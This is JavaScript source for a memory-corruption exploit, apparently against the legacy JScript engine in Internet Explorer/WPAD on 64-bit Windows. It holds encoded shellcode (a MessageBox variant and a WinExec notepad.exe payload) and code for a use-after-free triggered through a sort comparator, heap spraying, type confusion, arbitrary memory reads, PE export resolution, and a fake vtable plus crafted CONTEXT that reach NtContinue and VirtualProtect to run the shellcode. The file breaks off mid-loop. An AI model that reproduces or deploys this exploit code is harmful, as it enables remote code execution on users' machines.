var WindowsVersion = 7; // 8.1+ cannot be targetted by this variation of the exploit due to stack pivot protection in CFG via NTDLL.DLL!NtContinue: DEP can be disabled for shellcode region but shellcode itself cannot be executed without use of a stack pivot.
//var Shellcode = [ 0x08ec8348, 0xf7e48040, 0x88c1c748, 0xe8000d4e, 0x00000091, 0x48c78948, 0x5786c2c7, 0x8948000d, 0x00dee8f9, 0xb9480000, 0x72657375, 0x00003233, 0xe1894851, 0xe5894855, 0x20ec8348, 0x08ec8348, 0xf7e48040, 0x8948d0ff, 0xc7485dec, 0x06b81ac2, 0xc1894800, 0x0000abe8, 0xc9314d00, 0x7770b948, 0x0064656e, 0x49510000, 0xc748e089, 0x74656ec1, 0xb9485100, 0x2d747365, 0x2e72726f, 0x77b94851, 0x662e7777, 0x5172726f, 0x48e28948, 0x4855c931, 0x8348e589, 0x834820ec, 0x804008ec, 0xd0fff7e4, 0x5dec8948, 0x575041c3, 0xc8894956, 0x60c6c748, 0x65000000, 0x8b48ad48, 0x8b481840, 0x89483078, 0xc03148fe, 0x394805eb, 0x483474f7, 0x2f74f685, 0x385e8d48, 0x74db8548, 0xc2c7481a, 0x00000001, 0x084b8b48, 0x74c98548, 0x01a7e80a, 0x394c0000, 0x480874c0, 0x8b48c031, 0x48cbeb36, 0x5e10468b, 0xc358415f, 0xe5894855, 0x50ec8148, 0x57000002, 0x4d894856, 0x558948f8, 0xdb3148f0, 0x483c598b, 0x8348d901, 0x8b4818c1, 0x3148f875, 0x70598bdb, 0x48de0148, 0x8be87589, 0x45897441, 0x458b48c0, 0x205e8bf8, 0x48d80148, 0x48e04589, 0x48f8458b, 0x5e8bdb31, 0xd8014824, 0xd8458948, 0xf8458b48, 0x481c5e8b, 0x8948d801, 0x3148d045, 0x758948f6, 0x458b48c8, 0x18408be8, 0x0ff03948, 0x00010986, 0xf0894800, 0x850c8d48, 0x00000000, 0xe0558b48, 0xf8458b48, 0x48111c8b, 0x3148d801, 0xc18948d2, 0x0000f0e8, 0xf0453b00, 0x00d3850f, 0x89480000, 0x148d48f0, 0x458b4800, 0xb70f48d8, 0x8d480204, 0x0000850c, 0x8b480000, 0x8b48d055, 0x1c8bf845, 0xd8014811, 0xc8458948, 0xe84d8b48, 0x48ca8948, 0x5d8bdb31, 0xda0148c0, 0x0fc83948, 0x0000998c, 0xd0394800, 0x00908d0f, 0xc7480000, 0x0000c845, 0x31480000, 0x8d4890c9, 0xfffdb09d, 0x08148aff, 0x7400fa80, 0x2efa8028, 0x03c71975, 0x6c6c642e, 0x04c38348, 0x480003c6, 0xfeb09d8d, 0xff48ffff, 0x88daebc1, 0xc1ff4813, 0xebc3ff48, 0x0003c6d0, 0x48d23148, 0xfdb08d8d, 0x46e8ffff, 0x48000000, 0x4ee8c189, 0x48fffffe, 0x2e74c085, 0xb8458948, 0x48d23148, 0xfeb08d8d, 0x26e8ffff, 0x48000000, 0x8b48c289, 0x89e8b84d, 0x48fffffe, 0xebc84589, 0xc6ff4809, 0xfee7e990, 0x8b48ffff, 0x5f5ec845, 0x5dec8948, 0x894857c3, 0xdb3148d7, 0x74003980, 0x01b60f1a, 0xb60f600c, 0x48d301d0, 0xff48e3d1, 0xff8548c1, 0xff48e674, 0x48e1ebc1, 0xc35fd889, ]; // MessageBoxA
var Shellcode = [ 0x08ec8348, 0xf7e48040, 0xc1c74890, 0x000d4e88, 0x0055e890, 0x48900000, 0xc748c789, 0x006feac2, 0xf9894800, 0x0000a1e8, 0xc2c74800, 0x00000005, 0x6461b948, 0x6578652e, 0x48510000, 0x5c5357b9, 0x65746f6e, 0xb9485170, 0x575c3a43, 0x4f444e49, 0xe1894851, 0xe5894855, 0x20ec8348, 0x08ec8348, 0xf7e48040, 0x8948d0ff, 0x41c35dec, 0x49565750, 0xc748c889, 0x000060c6, 0xad486500, 0x18408b48, 0x30788b48, 0x48fe8948, 0x05ebc031, 0x74f73948, 0xf6854834, 0x8d482f74, 0x8548385e, 0x481a74db, 0x0001c2c7, 0x8b480000, 0x8548084b, 0xe80a74c9, 0x000001ae, 0x74c0394c, 0xc0314808, 0xeb368b48, 0x468b48cb, 0x415f5e10, 0x4855c358, 0x8148e589, 0x000250ec, 0x48565700, 0x48f84d89, 0x48f05589, 0x598bdb31, 0xd901483c, 0x18c18348, 0xf8758b48, 0x8bdb3148, 0x01487059, 0x758948de, 0x74418be8, 0x48c04589, 0x8bf8458b, 0x0148205e, 0x458948d8, 0x458b48e0, 0xdb3148f8, 0x48245e8b, 0x8948d801, 0x8b48d845, 0x5e8bf845, 0xd801481c, 0xd0458948, 0x48f63148, 0x48c87589, 0x8be8458b, 0x39481840, 0x10860ff0, 0x48000001, 0x8d48f089, 0x0000850c, 0x8b480000, 0x8b48e055, 0x1c8bf845, 0xd8014811, 0x48d23148, 0xf7e8c189, 0x3b000000, 0x850ff045, 0x000000da, 0x48f08948, 0x4800148d, 0x48d8458b, 0x0204b70f, 0x850c8d48, 0x00000000, 0xd0558b48, 0xf8458b48, 0x48111c8b, 0x8948d801, 0x8b48c845, 0x8948e84d, 0xdb3148ca, 0x48c05d8b, 0x3948da01, 0xa08c0fc8, 0x48000000, 0x8d0fd039, 0x00000097, 0xc845c748, 0x00000000, 0x90c93148, 0xb09d8d48, 0x8afffffd, 0xfa800814, 0x802f7400, 0x20752efa, 0x642e03c7, 0x83486c6c, 0x03c604c3, 0x9005eb00, 0x90909090, 0xb09d8d48, 0x48fffffe, 0xd3ebc1ff, 0xff481388, 0xc3ff48c1, 0x03c6c9eb, 0xd2314800, 0xb08d8d48, 0xe8fffffd, 0x00000046, 0xe8c18948, 0xfffffe47, 0x74c08548, 0x4589482e, 0xd23148b8, 0xb08d8d48, 0xe8fffffe, 0x00000026, 0x48c28948, 0xe8b84d8b, 0xfffffe82, 0xc8458948, 0xff4809eb, 0xe0e990c6, 0x48fffffe, 0x5ec8458b, 0xec89485f, 0x4857c35d, 0x3148d789, 0x003980db, 0xb60f1a74, 0x0f600c01, 0xd301d0b6, 0x48e3d148, 0x8548c1ff, 0x48e674ff, 0xe1ebc1ff, 0x5fd88948, 0x000000c3, ]; // WinExec notepad.exe
var SortArray = new Array(); // Initializing this locally rather than globally causes stack issues, particularly in regards to WPAD.
for(var i = 0; i <= 150; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort comparator

////////
////////
// Debug/timer code
////////

var EnableDebug = false; // When debug is enabled the distinction between "stack overflow" and "out of memory" errors are lost: console always determines there to be an "out of memory" condition even though this only sppears after scoping of SortDepth is changed.
var EnableTimers = false;
var AlertOutput = false;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// UAF/untracked variable creation code
////////

var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 0; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;
    
function GlitchedComparator(Untracked1, Untracked2) {
    Untracked1 = VarSpray[SortDepth*2];
    Untracked2 = VarSpray[SortDepth*2 + 1];
    
    if(SortDepth >= 150) {
        VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    else {
        SortDepth += 1;
        
        // There is a difference between the stack size between WPAD and Internet Explorer. In IE, a stack overflow exception will occur around depth 250 however in WPAD it will occur on a depth of less than 150, ensuring a stack overflow exception/alert will be thrown in the exploit. This try/catch in conjunction with a global initialization of the sort array allows the depth to be sufficient to produce an untracked var which will overlap with the type confusion offset in the re-claimed GcBlock.
        
        try {
            SortArray[SortDepth].sort(GlitchedComparator);
        }
        catch(ex) {
            VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
            CollectGarbage(); // Free the GcBlocks
        }
        
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    
    return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(var i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(var i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedComparator); // Two untracked vars will be passed to this method by the JS engine
}

////////
////////
// UAF re-claim/mutable variable code (used for arbitrary read)
////////

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(570).join('A');
var MutableVar;
var ReClaimNameList;

function ReClaimIndexNameList(Value, PropertyName) {
    CollectGarbage(); // Cleanup - note that removing this has not damaged stability of the exploit in any of my own tests and its removal significantly improved exploit performance (each arbitrary read is about twice as fast). I've left it here from maxspl0it's original version of the exploit to ensure stability.
    AnchorObjectsBackup[LeakedAnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[LeakedAnchorIndex] = new Object();
    AnchorObjectsBackup[LeakedAnchorIndex][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
    AnchorObjectsBackup[LeakedAnchorIndex]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[LeakedAnchorIndex]["\u0005"] = 1;
    AnchorObjectsBackup[LeakedAnchorIndex][PropertyName] = Value; // The mutable variable
    ReadCount++;
}

function ReClaimBackupNameLists(Value, PropertyName) { // This function is assuming the leaked anchor index is within the range being freed/re-allocated
    CollectGarbage(); // Cleanup
    for(var i = 0; i < NameListAnchorCount; i++) AnchorObjectsBackup[i] = null;//NameListAnchorCount
    CollectGarbage(); // Free the leaked NameList
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0005"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
}

function CreateVar64(Type, ObjPtrLow, ObjPtrHigh, NextPtrLow, NextPtrHigh) {
    var CharCodes = new Array();
    
    CharCodes.push(
         // Type
        Type, 0, 0, 0,
        // Object pointer
        ObjPtrLow & 0xffff, (ObjPtrLow >> 16) & 0xffff, ObjPtrHigh & 0xffff, (ObjPtrHigh >> 16) & 0xffff,
        // Next pointer
        NextPtrLow & 0xffff, (NextPtrLow >> 16) & 0xffff, NextPtrHigh & 0xffff, (NextPtrHigh >> 16) & 0xffff);
        
    return String.fromCharCode.apply(null, CharCodes);
}

function LeakByte64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length >> 15) & 0xff; // Shift to align and get the byte.
}

function LeakWord64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
}

function LeakDword64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 4, Address.high, 0, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return LowWord + (HighWord << 16);
}

function LeakQword64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 4, Address.high, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 6, Address.high, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 8, Address.high, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    return MakeDouble(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16));
}

function LeakObjectAddress64(ObjVarAddress, ObjVarValue) { // This function does not always work, there are some edge cases. For example if a BSTR is declared var A = "123"; it works fine. However, var A = "1"; A += "23"; resuls in multiple layers of VARs referencing VARs and this function will no longer get the actual BSTR address.
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 2, ObjVarAddress.high, 0, 0));
    var LowLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 4, ObjVarAddress.high, 0, 0));
    var LowHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 6, ObjVarAddress.high, 0, 0));
    var HighLow = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    ReClaimNameList(ObjVarValue, CreateVar64(0x8, ObjVarAddress.low + 8 + 8, ObjVarAddress.high, 0, 0));
    var HighHigh = ((MutableVar.length >> 15) & 0xff) + (((MutableVar.length >> 23) & 0xff) << 8);
    var DerefObjVarAddress = MakeDouble(HighLow + (HighHigh << 16), LowLow + (LowHigh << 16) + 8);
    return LeakQword64(DerefObjVarAddress); // The concept here is to turn the property name (the mutable var) into a BSTR VAR pointing at its own VVAL (which starts with another, real VAR). The real VAR can be set dynamically to the address of the desired object. So there are two stages: first to read the object pointer out of the VAR within the final VVAL, and then to leak the object pointer of the VAR it is pointing to (skipping +8 over its Type field)
}

////////
////////
// PE parsing/EAT and IAT resolution code
////////

function ResolveExport64(ModuleBase, TargetExportNameTable) {
    var FileHdrRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + 0x3c));
    var EATRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + FileHdrRva + 0x88));
	
	if(EATRva) {
        var TotalExports = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x14));
        var AddressRvas = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x1C));
        var NameRvas = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x20));
        var OrdinalRvas = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + EATRva + 0x24));
        var MaxIndex = TotalExports;
        var MinIndex = 0;
        var CurrentIndex = Math.floor(TotalExports / 2);
        var TargetTableIndex = 0;
        var BinRes = 0;
        
        while(TotalExports) { 
            var CurrentNameRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + NameRvas + 4*CurrentIndex));

            while (TargetTableIndex < TargetExportNameTable.length) {
                var CurrentNameWord = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + (CurrentNameRva + (4 * TargetTableIndex))));
                var TargetExportNameWord = (TargetExportNameTable[TargetTableIndex] & 0x0000FFFF);
                var SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                BinRes = BinaryCmp(TargetExportNameWord, SanitizedCurrentNameWord);

                if(!BinRes) {
                    TargetExportNameWord = ((TargetExportNameTable[TargetTableIndex] & 0xFFFF0000) >> 16);
                    CurrentNameWord = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + (CurrentNameRva + (4 * TargetTableIndex)) + 2));
                    SanitizedCurrentNameWord = NullSanitizeWord(CurrentNameWord);
                    BinRes = BinaryCmp(TargetExportNameWord, SanitizedCurrentNameWord);

                    if(!BinRes) {
                        if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
                            var Ordinal = LeakWord64(MakeDouble(ModuleBase.high, ModuleBase.low + OrdinalRvas + 2*CurrentIndex));
                            var MainExport = MakeDouble(ModuleBase.high, ModuleBase.low + LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + AddressRvas + 4*Ordinal)));
                            //DebugLog("Found perfect match at table index " + TargetTableIndex.toString(10) + ": 0x" + TargetExportNameWord.toString(16) + " matched 0x" + SanitizedCurrentNameWord.toString(16));
                            return MainExport;
                        }
                        else {
                            //DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10));
                        }
                        
                        TargetTableIndex++;
                    }
                    else {
                        TargetTableIndex = 0;
                        break;
                    }
                }
                else {
                    TargetTableIndex = 0;
                    break;
                }
            }
            
            if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
                if(MaxIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit max");
                    break;
                }
                
                MaxIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
            } 
            else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
                if(MinIndex == CurrentIndex) {
                    DebugLog("Failed to find export: index hit min");
                    break;
                }
                
                MinIndex = CurrentIndex;
                CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
            }
            
            if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
                DebugLog("Failed to find export: current, min and max indexes are all equal");
                break;
            }
        }
    }
    
    return MakeDouble(0, 0);
}

function SelectRandomImport64(ModuleBase, TargetModuleNameTable) { // Grab the first IAT entry of a function within the specified module
    var ExtractedAddresss = MakeDouble(0, 0);
    var FileHdrRva = LeakDword64(MakeDouble(ModuleBase.high, ModuleBase.low + 0x3c));
    var ImportDataDirAddress = MakeDouble(ModuleBase.high, ModuleBase.low + FileHdrRva + 0x90); // Import data directory
    var ImportRva = LeakDword64(ImportDataDirAddress);
    var ImportSize = LeakDword64(MakeDouble(ImportDataDirAddress.high, ImportDataDirAddress.low + 0x4)); // Get the size field of the import data dir
    var DescriptorAddress = MakeDouble(ModuleBase.high, ModuleBase.low + ImportRva);
    
    while(ImportSize != 0) {
        var NameRva = LeakDword64(MakeDouble(DescriptorAddress.high, DescriptorAddress.low + 0xc)); // 0xc is the offset to the module name pointer
        
        if(NameRva != 0) {
            if(StrcmpLeak64(TargetModuleNameTable, MakeDouble(ModuleBase.high, ModuleBase.low + NameRva))) {
                var ThunkRva = LeakDword64(MakeDouble(DescriptorAddress.high, DescriptorAddress.low + 0x10));
                ExtractedAddresss = LeakQword64(MakeDouble(ModuleBase.high, ModuleBase.low + ThunkRva + 8)); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
                break;
            }
            
            ImportSize -= 0x14;
            DescriptorAddress.low += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

function DiveModuleBase64(Address) {
    Address.low = (Address.low & 0xFFFF0000) + 0x4e; // Offset of "This program cannot be run in DOS mode" in PE header.
    
    while(true) {
        if(LeakWord64(Address) == 0x6854) { // 'hT'
            if(LeakWord64(MakeDouble(Address.high, Address.low + 2)) == 0x7369) { // 'si'
                return MakeDouble(Address.high, Address.low - 0x4e);
            }
        }
        
        Address.low -= 0x10000;
    }
    
    return MakeDouble(0, 0);
}

function BaseFromImports64(ModuleBase, TargetModuleNameTable) {
    var RandomImportAddress = SelectRandomImport64(ModuleBase, TargetModuleNameTable);
    
    if(RandomImportAddress.low || RandomImportAddress.high) {
        return DiveModuleBase64(RandomImportAddress);
    }
    
    return MakeDouble(0, 0);
}

////////
////////
// Misc. helper functions
////////

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord & 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else {
            Sanitized = StrWord;
        }
    }
    
    return Sanitized;
}

function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum & 0xff) > (CmpNum & 0xff)) {
            return -1;
        }
        else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
            return 1;
        }
        
        TargetNum = TargetNum >> 8;
        CmpNum = CmpNum >> 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function QwordToUnicode(Value) {
    return String.fromCharCode.apply(null, [Value.low & 0xffff, (Value.low >> 16) & 0xffff, Value.high & 0xffff, (Value.high >> 16) & 0xffff]);
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for(var i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function DwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for(var i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

function StrcmpLeak64(StrDwordTable, LeakAddress) { // Compare two strings between an array of WORDs and a string at a memory address
    var TargetTableIndex = 0;
    
    while (TargetTableIndex < StrDwordTable.length) {
        var LeakStrWord = LeakWord64(MakeDouble(LeakAddress.high, LeakAddress.low + (4 * TargetTableIndex)));
        var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
        var TableWord = (StrDwordTable[TargetTableIndex] & 0x0000FFFF);
        
        if(TableWord == SanitizedStrWord) {
            LeakStrWord = LeakWord64(MakeDouble(LeakAddress.high, LeakAddress.low + (4 * TargetTableIndex) + 2));
            SanitizedStrWord = NullSanitizeWord(LeakStrWord);
            TableWord = ((StrDwordTable[TargetTableIndex] & 0xFFFF0000) >> 16);
            
            if(TableWord == SanitizedStrWord) {
                if((TargetTableIndex + 1) >= StrDwordTable.length) {
                    DebugLog("Found match at table index " + TargetTableIndex.toString(10) + ": 0x" + TableWord.toString(16) + " matched 0x" + SanitizedStrWord.toString(16));
                    return true;
                }
                else {
                    DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10) + " DWORD array length is: " + StrDwordTable.length.toString(10));
                }
                
                TargetTableIndex++;
            }
            else {
                break;
            }
        }
        else {
            break;
        }
    }
    
    return false;
}

function MakeDouble(High, Low) {
    return Int52ToDouble(QwordToInt52(High, Low));
}

function QwordToInt52(High, Low) {
    // Sanity check via range. Not all QWORDs are going to be valid  52-bit integers that can be converted to doubles
    
    if ((Low !== Low|0) && (Low !== (Low|0)+4294967296)) {
        alert ("Low out of range: 0x" + Low.toString(16));
    }
    
    if (High !== High|0 && High >= 1048576) {
        alert ("High out of range: 0x" + High.toString(16));
    }

    if (Low < 0) {
        Low += 4294967296;
    }

    return High * 4294967296 + Low;
}

function Int52ToDouble(Value) {
    var Low = Value | 0;
    
    if (Low < 0) {
        Low += 4294967296;
    }

    var High = Value - Low;
    
    High /= 4294967296;
    
    if ((High < 0) || (High >= 1048576)) {
        alert("Fatal error - not an int52: 0x" + Value.toString(16));
        Loew = 0;
        High = 0;
    }
    
    return { low: Low, high: High };
}

function MakeQword(High, Low) {
    return { low: Low, high: High };
}

////////
////////
// Primary high level exploit logic
////////

var LFHBlocks = new Array(); // If this is local rather than global the exploit does not work on Windows 8.1 IE11 64-bit

function MakeContext64(StackPtr, VirtualProtectAddress, ShellcodeAddress, ShellcodeSize, WritableAddress) {
    return "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    QwordToUnicode(ShellcodeAddress) + // Rcx
    QwordToUnicode(ShellcodeSize) + // Rdx
    "\u0000\u0000\u0000\u0000" + // Rbx
    QwordToUnicode(StackPtr) + // Rsp
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0040\u0000\u0000\u0000" + // R8
    QwordToUnicode(WritableAddress) + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    "\u0000\u0000\u0000\u0000" + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    QwordToUnicode(VirtualProtectAddress); // RIP
}

function CreateFakeVtable(NtContinueAddress) {
    /*
    
    [Padding]
    [Empty methods]
    [Typeof method] -> NTDLL.DLL!NtContinue
    
    With no ROP chain to consider, no stack alignment gadget is needed: on x64 RCX can be controlled and thus
    there is no need for a stack pivot.
    
    */
    
    var FakeVtable = "";
    var Y = 0;
    
    while (FakeVtable.length < 0x400) {
        if(Y == 0x138) {
            FakeVtable += DwordArrayToBytes([NtContinueAddress.low]);
        }
        else if(Y == 0x13C) {
            FakeVtable += DwordArrayToBytes([NtContinueAddress.high]);
        }
        else {
            FakeVtable += DwordArrayToBytes([0x11111111]);
        }
        
        Y += 4;
    }
    
    return FakeVtable;
}

function Exploit() {
    // Initialization
    
    if(WindowsVersion <= 7) {
        ReClaimNameList = ReClaimIndexNameList;
        NameListAnchorCount = 20000;
    }
    else {
        ReClaimNameList = ReClaimBackupNameLists;
        NameListAnchorCount = 40000; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
    }
    
    // Trigger LFH for a size of 0x970

    for(var i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(570).join('A')] = 1; // Property name size of 0x239 (569 chars with a default +1 added as a terminator) will produce the desired re-claim allocation size.
        LFHBlocks.push(Temp);
    }
    
    // Re-claim with type confusion NameLists
    
    StartTimer();
    NewUntrackedVarSet();
    DebugLog("Total untracked variables: " + UntrackedVarSet.length.toString(10));
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
        NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
    EndTimer("Infoleak VAR creation + re-claim");
    
    // Backup name list anchor objects (this will allow re-claim to "stick")
    
    StartTimer();
    AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    EndTimer("Anchor backup");
    
    // Leak final VVAL address from one of the NameLists
    
    StartTimer();
    var LeakedVvalAddress = 0;
    var TypeConfusionAligned = false;
    
    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] % 1 != 0) {
            LeakedVvalAddress = (UntrackedVarSet[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            TypeConfusionAligned = true;
            break;
        }
    }
    
    if(!TypeConfusionAligned) {
        DebugLog("Leaked anchor object type confusion re-claim failed: no untracked var aligned with type confusion float/next VVAL pointer");
        return 0;
    }
    
    EndTimer("Infoleak VAR scan");
    LeakedVvalAddress = Int52ToDouble(LeakedVvalAddress); // In Windows 7, the leaked heap pointer could always be encoded in 32-bits. On Windows 8.1 IE11, it often consumes more. By leaking the final VVAL pointer with a double float we can get the bits we need. Experimenting with this I learned all JS numbers are 52 bits in size. In the event that the leaked pointer has its highest bits set it may be an invalid double. This hasn't be an issue on Windows 7 x64, x86, or Windows 8.1 x64 during my testing.
    
    if(!LeakedVvalAddress.high && !LeakedVvalAddress.low) {
        DebugLog("Leaked anchor object type confusion re-claim failed: conversion of leaked VVAL address (type confusion successful) to double failed (invalid 52-bit integer)");
        return 0;
    }
    
    // Re-claim with VAR-referencing-VAR NameLists
    
    var PrimaryVvalPropName = "AAAAAAAA"; // 16 bytes for size of GcBlock double linked list pointers

    for(var i = 0; i < 46; i++) {
